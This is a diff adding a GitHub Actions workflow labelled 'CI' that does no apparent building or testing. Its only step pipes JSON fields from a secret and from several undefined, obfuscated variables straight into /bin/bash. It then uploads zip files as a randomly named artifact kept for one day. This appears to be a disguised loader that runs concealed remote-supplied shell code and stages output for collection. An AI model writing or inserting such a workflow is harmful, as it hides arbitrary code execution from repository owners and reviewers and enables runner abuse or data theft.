@@ -1,0 +1,32 @@
+name: CI
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  scheduler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Invoke
+        env:
+          f5635: ${{ secrets.f5635 }}
+        run: |
+          printf '%s' "$f5635" | jq -r .nn406 | /bin/bash
+          printf '%s' "$xdf57" | jq -r .iu1771 | /bin/bash
+          echo $vob72180 | jq -r .hl8445 | /bin/bash
+          printf '%s' "$wicq73" | jq -r .e80409 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: VcItZnfn
+          path: "*.zip"
+          retention-days: 1
